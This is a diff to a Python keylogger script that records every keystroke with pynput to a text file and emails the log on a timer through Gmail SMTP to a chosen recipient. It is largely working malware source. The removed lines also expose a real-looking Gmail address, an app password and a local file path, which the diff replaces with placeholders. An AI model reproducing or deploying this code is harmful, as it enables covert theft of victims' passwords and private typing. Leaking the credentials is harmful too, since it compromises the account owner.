@@ -1,5 +1,5 @@
 #Jacob Beason, 12/9/25
-# This program logs keystrokes using pynput and saves them to a txt file, then using SMTP sends the file to an email address
+# This program logs keystrokes using the pynput lib and saves them to a txt file, then using SMTP sends the file to an email address on a desired interval
 #
 
 import smtplib
@@ -9,7 +9,9 @@ from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
 import os
-import time
+from time import time 
+
+
 
 def send_email_with_attachment(sender_email, sender_password, recipient_email, subject, body, file_path, smtp_server="smtp.gmail.com", smtp_port=587):
     
@@ -32,11 +34,11 @@ def send_email_with_attachment(sender_email, sender_password, recipient_email, s
         # Encode file in base64
         encoders.encode_base64(part)
         
-        # Add header with filename
+        # Adds header with filename
         filename = os.path.basename(file_path)
         part.add_header('Content-Disposition', f'attachment; filename= {filename}')
         
-        # Attach the file to the message
+        # Attaches the file to the message
         msg.attach(part)
         
     except FileNotFoundError:
@@ -48,7 +50,7 @@ def send_email_with_attachment(sender_email, sender_password, recipient_email, s
     
     # Send the email
     try:
-        # Create SMTP session
+        # Creates SMTP session
         server = smtplib.SMTP(smtp_server, smtp_port)
         server.starttls()  # Enable TLS encryption
         
@@ -65,11 +67,11 @@ def send_email_with_attachment(sender_email, sender_password, recipient_email, s
     except smtplib.SMTPAuthenticationError:
         print("Authentication failed. Check your email and password.")
         return False
-    except smtplib.SMTPException as e:
-        print(f"SMTP error occurred: {e}")
+    except smtplib.SMTPException as ex:
+        print(f"SMTP error occurred: {ex}")
         return False
-    except Exception as e:
-        print(f"Error sending email: {e}")
+    except Exception as ex:
+        print(f"Error sending email: {ex}")
         return False
 
 
@@ -89,7 +91,7 @@ def email_loop(seconds, num_repetitions=None):
 # Detects keystrokes and writes them to a txt file
 def keyPressed(key):
     print(str(key))
-    with open("keyfile.txt", 'a') as logKey:
+    with open("keyfile.txt", 'a') as logKey: #enter your txt file name
         try:
             char = key.char
             logKey.write(char)
@@ -98,7 +100,7 @@ def keyPressed(key):
 
 
 if __name__ == "__main__":
-    # Initialize keylogger
+    # Call keylogger
     listener = keyboard.Listener(on_press=keyPressed)
     listener.start()
     input()
@@ -106,15 +108,15 @@ if __name__ == "__main__":
    
 
     # Configuration
-    SENDER_EMAIL = "bocajj2007@gmail.com"
-    SENDER_PASSWORD = "ixan xutp yrgp gpbb"  # Use app-specific password for Gmail
-    RECIPIENT_EMAIL = "sprsrr00@gmail.com"
+    SENDER_EMAIL = "Enter sender email"
+    SENDER_PASSWORD = "Enter app pass"  # Use gmail app password
+    RECIPIENT_EMAIL = "Enter recipeient email"
     
     # Email details
     subject = "keylog"
     body = ""
-    file_path = "/Users/jacobbeason/python proj/keyfile.txt"  # Path to  file
+    file_path = ""  # Path to txt file
 
-    #Initalize email loop
-    email_loop(3600,None)
+    #Call email loop
+    email_loop(1200,None)
     
